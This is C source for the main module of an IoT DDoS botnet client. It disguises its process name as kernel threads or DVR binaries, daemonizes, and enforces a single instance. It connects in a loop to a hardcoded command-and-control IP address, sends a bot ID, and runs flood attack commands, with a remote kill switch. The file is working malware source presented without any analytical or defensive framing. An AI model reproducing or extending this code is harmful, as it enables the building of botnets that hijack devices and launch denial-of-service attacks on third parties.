#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <time.h>
#include <signal.h>

#include "xor.h"
#include "config.h"

#include "floods.h"

static void ensure_single_instance(void);

const char *system_processes[] = {
	"[kworker]",
	"[init]",
	"[khelper]",
	"/var/Sofia",
	"/var/Kylin",
	"/bin/busybox",
	"-sh",
	"/bin/login",
	"[watchdog0]",
	"[kthreadd]"
};

void receive_from_cnc(int fd, char *argszero)
{
	char buffer[1024];
	fd_set fdset_rd, fdset_wr;

	int err = 1, i, len;

	while (1)
	{
		FD_ZERO(&fdset_rd);
		FD_ZERO(&fdset_wr);

		FD_SET(fd, &fdset_rd);

		struct timeval tv;
		tv.tv_usec = 0;
		tv.tv_sec = 1;

		select(fd + 1, &fdset_rd, NULL, NULL, &tv);
		spoof_name_generator(argszero);

		socklen_t errlen = sizeof(err);

		if(FD_ISSET(fd, &fdset_rd))
		{
			recv(fd, buffer, sizeof(buffer), MSG_NOSIGNAL);

			len = strlen(buffer) + 1;

			for(i = 0; i < len; i++)
			{
				if(buffer[i] == '\n')
					buffer[i] = 0;
			}

			if(strstr(buffer, "/killallbots"))
				exit(0);

			if(strlen(buffer) > 0)
			{
#ifdef DEBUG
				printf("received: %s from CNC!\n", buffer);
#endif
				attack_parse_floods(buffer);

			}
			memset(buffer, 0, sizeof(buffer));
		}
		usleep(10000);
	}
}

void connect_to_cnc(char *argszero, char *idbuf)
{
	int fd, err = 1, ret = 0, i;

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(437);
	addr.sin_addr.s_addr = inet_addr("45.95.168.124");

	while(1)
	{
		fd_set fdset_wr;

		fd = socket(AF_INET, SOCK_STREAM, 0);
	
		fcntl(fd, F_SETFL, O_NONBLOCK);

		connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

		FD_ZERO(&fdset_wr);

		FD_SET(fd, &fdset_wr);

		struct timeval tv;
		tv.tv_usec = 0;
		tv.tv_sec = 1;

		select(fd + 1, NULL, &fdset_wr, NULL, &tv);

		if(FD_ISSET(fd, &fdset_wr))
		{
			socklen_t errlen = sizeof(err);

			getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &errlen);

			if(err == 0)
			{
#ifdef DEBUG
				printf("[main] connected to CNC!\n");
#endif
				strcat(idbuf, "\r\n");
				send(fd, idbuf, strlen(idbuf), MSG_NOSIGNAL);
				receive_from_cnc(fd, argszero);
			}
			else
			{
#ifdef DEBUG
				printf("[main] Connection to CNC timedout!\n");
#endif
				close(fd);
				sleep(rand() % 7 + 2);
			}
		}
		else
		{
			sleep(rand() % 7 + 2);
			close(fd);
		}
	}
}

void spoof_name_generator(char *namespoof)
{
	prctl(PR_SET_NAME, system_processes[rand() % sizeof(system_processes) / sizeof(system_processes[0])]);
	strcpy(namespoof, system_processes[rand() % sizeof(system_processes) / sizeof(system_processes[0])]);
}

static void ensure_single_instance(void)
{
	int fd, opt = 1;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));

	struct sockaddr_in bind_addr;
	bind_addr.sin_family = AF_INET;
	bind_addr.sin_port = htons(9234);
	bind_addr.sin_addr.s_addr = INADDR_ANY;

	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
		kill(getpid(), 9);
	else
		listen(fd, 1);
}

int main(int argc, char **args)
{
	spoof_name_generator(args[0]);

#ifdef DEBUG
	printf("debug started on (pid=%d)\n", getpid());
#endif
	ensure_single_instance();

	xor_init();
	srand(time(0));

	chdir("/");

	crypt_unlock_val(EXEC_MSG);
	write(1, enc[EXEC_MSG].value, strlen(enc[EXEC_MSG].value));
	write(1, "\n", strlen("\n"));
	crypt_lock_val(EXEC_MSG);

	 signal(SIGCHLD, SIG_IGN);

#ifndef DEBUG	
	int pgid;
	if (fork() > 0)
	    return 0;
	pgid = setsid();
	    close(0);
	    close(1);
	    close(2);
#endif

	while (1)
		connect_to_cnc(args[0], args[1]);

	return 0;
}
